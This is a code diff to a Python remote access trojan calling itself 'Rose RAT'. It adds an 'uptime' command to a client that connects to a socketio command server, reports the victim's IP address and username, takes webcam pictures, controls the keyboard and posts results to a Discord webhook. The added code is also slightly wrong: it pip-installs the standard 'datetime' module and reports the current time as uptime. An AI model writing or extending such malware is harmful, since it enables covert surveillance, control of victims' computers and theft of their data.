@@ -11,6 +11,7 @@ try:
     import string
     import ctypes
     import os
+    from datetime import datetime
     import subprocess
     import io
     from dhooks import Webhook as web
@@ -19,7 +20,7 @@ try:
     from pynput.keyboard import Key, Controller
 except Exception:
     import subprocess
-    subprocess.run("python -m pip install python-socketio && python -m pip install pynput && python -m pip install pyttsx3", shell=True)
+    subprocess.run("python -m pip install python-socketio && python -m pip install pynput && python -m pip install pyttsx3 && python -m pip install datetime", shell=True)
 sio = socketio.Client()
 
 
@@ -117,11 +118,24 @@ class CommandHandler():
         engine.setProperty('rate', 150)
         engine.say(text)
         engine.runAndWait()
-            
+        
+    def uptime(self):
+        embed = Embed(
+            description='Rose RAT',
+            color=11495919,
+            timestamp='now'  # sets the timestamp to current time
+        )
+
+        embed.set_author(name=f"Connection Uptime", icon_url=cc.get_avatar())
+        embed.add_field(name="Uptime :",value=datetime.now())
+        embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
+        
+        self.webhook.send(embed=embed)            
 cmdhandler = CommandHandler()
 
 @sio.event
 def connect():
+    start_time = datetime.now()
     sio.emit('rose_connect', {'data': {
         'ip': ii.get_ip(),
         'username': ii.get_username(),
@@ -156,6 +170,9 @@ def receive_command(data):
 
     if data['data'] == 'webcampic':
         cmdhandler.webcampic()
+        
+    if data["data"] == "uptime":
+        cmdhandler.uptime()
 
 
 @sio.event
